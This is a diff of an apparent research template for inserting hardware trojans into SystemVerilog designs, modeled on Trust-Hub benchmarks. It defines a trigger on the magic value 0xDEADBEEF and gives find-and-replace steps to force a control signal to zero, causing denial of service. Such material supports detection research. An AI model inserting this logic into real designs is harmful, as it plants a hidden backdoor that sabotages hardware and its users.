@@ -5,20 +5,23 @@
  * Trust-Hub Benchmarks: AES-T1800, AES-T1900, AES-T500, BasicRSA-T200
  * 
  * Description:
- *   Disables control signals based on trigger condition
+ *   Disables operations by blocking {{PAYLOAD_SIGNAL}} based on pattern match
  *   
  * Trigger: Pattern match on {{TRIGGER_SIGNAL}}
- * Payload: Force {{PAYLOAD_SIGNAL}} = 0
+ * Payload: Force {{PAYLOAD_SIGNAL}} = 0 when pattern detected
+ * 
+ * NOTE: This is for COMBINATIONAL modules (no clock/registers).
+ *       Uses immediate pattern matching, not counters.
  * 
  * Author: Sharjeel Imtiaz (TalTech)
  * Date: January 2026
  */
 
 // ============================================================
-// TROJAN TRIGGER LOGIC (Condition-based)
+// TROJAN TRIGGER LOGIC (Pattern-based, immediate)
 // ============================================================
 
-// Magic pattern that triggers the trojan
+// Magic pattern that activates the trojan
 localparam logic [31:0] TRIGGER_PATTERN = 32'hDEADBEEF;
 
 // Trojan activates when trigger signal matches pattern
@@ -28,14 +31,19 @@ assign trojan_active = ({{TRIGGER_SIGNAL}} == TRIGGER_PATTERN);
 // ============================================================
 // PAYLOAD MODIFICATION INSTRUCTIONS
 // ============================================================
-// DoS Attack: Disable {{PAYLOAD_SIGNAL}} when pattern detected
+// DoS Attack: Block {{PAYLOAD_SIGNAL}} when pattern detected
 //
-// Integration Script Must Modify:
+// METHOD 1: If signal has assign statement
+//   Find:
+//     assign {{PAYLOAD_SIGNAL}}_internal = {{PAYLOAD_SIGNAL}};
+//   Replace:
+//     assign {{PAYLOAD_SIGNAL}}_internal = {{PAYLOAD_SIGNAL}} && !trojan_active;
 //
-// IF {{PAYLOAD_SIGNAL}} is assigned:
-//   Find: assign {{PAYLOAD_SIGNAL}} = value;
-//   Replace: assign {{PAYLOAD_SIGNAL}} = trojan_active ? 1'b0 : value;
+// METHOD 2: If used in combinational logic
+//   Find:
+//     assign output = {{PAYLOAD_SIGNAL}} & other_signals;
+//   Replace:
+//     assign output = ({{PAYLOAD_SIGNAL}} && !trojan_active) & other_signals;
 //
-// IF {{PAYLOAD_SIGNAL}} is used in expression:
-//   Find: some_output = {{PAYLOAD_SIGNAL}} & other_signal;
-//   Replace: some_output = (trojan_active ? 1'b0 : {{PAYLOAD_SIGNAL}}) & other_signal;
+// Effect: When trojan_active = 1, {{PAYLOAD_SIGNAL}} is effectively 0
+//         All operations controlled by this signal stop = DoS!
